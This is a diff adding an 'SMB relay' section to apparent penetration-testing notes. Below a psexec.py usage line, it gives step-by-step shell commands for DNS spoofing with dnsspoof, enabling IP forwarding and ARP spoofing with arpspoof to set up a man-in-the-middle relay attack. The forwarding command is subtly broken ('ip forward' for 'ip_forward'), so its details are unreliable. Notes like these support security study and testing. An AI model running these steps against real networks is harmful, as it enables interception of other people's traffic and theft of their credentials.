@@ -32,3 +32,19 @@ https://github.com/veso266/impacket/blob/master/examples/psexec.py
 ```shell
 psexec.py user@ip cmd.exe
 ```
+# SMB relay
+the `smb_relay` metasploit module allows you to perform a relay attack on a smb server, which is a mitm attack on a target system
+using dnsspoof to spoof the dns record of a legitimate server to refer to you
+
+```shell
+echo "ip *.domain" > dns
+dnsspoof -i interface -f dns
+```
+then you need to do ip forwarding
+```shell
+echo 1 > /proc/sys/net/ipv4/ip forward
+```
+then you need to do arp spoofing
+```shell
+arpspoof -i interface -t gateway target
+```
